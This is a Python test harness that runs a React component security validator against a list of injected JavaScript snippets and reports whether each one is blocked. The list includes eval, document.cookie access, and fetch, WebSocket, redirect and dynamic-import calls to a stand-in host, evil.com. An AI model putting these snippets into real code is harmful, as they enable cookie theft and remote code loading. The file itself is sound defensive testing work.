from babel_bridge import validate_component_code, SyntaxValidationError, SecurityValidationError

BASE = """
import React from "react";
export default function T() {
  __BODY__
  return <div>hi</div>;
}
"""

CASES = {
    "CONTROL (safe, should PASS)": "const x = 1;",
    "eval": 'eval("1");',
    "new Function": 'new Function("return 1")();',
    "fetch": 'fetch("https://evil.com");',
    "document.cookie": "const c = document.cookie;",
    "window.location": 'window.location = "https://evil.com";',
    "localStorage": 'localStorage.getItem("x");',
    "XMLHttpRequest": "new XMLHttpRequest();",
    "WebSocket": 'new WebSocket("ws://evil.com");',
    "dynamic import()": 'import("https://evil.com/x.js");',
    "setTimeout with string": 'setTimeout("alert(1)", 10);',
    "innerHTML assignment": 'document.body.innerHTML = "x";',
    "require": 'require("fs");',
    "globalThis.fetch": 'globalThis.fetch("x");',
}

for name, body in CASES.items():
    code = BASE.replace("__BODY__", body)
    try:
        validate_component_code(code)
        result = "ALLOWED"
    except SecurityValidationError:
        result = "BLOCKED (security)"
    except SyntaxValidationError:
        result = "SYNTAX ERROR (test case problem)"
    except Exception as e:
        result = "OTHER ERROR: " + type(e).__name__
    print(f"{result:35} <- {name}")
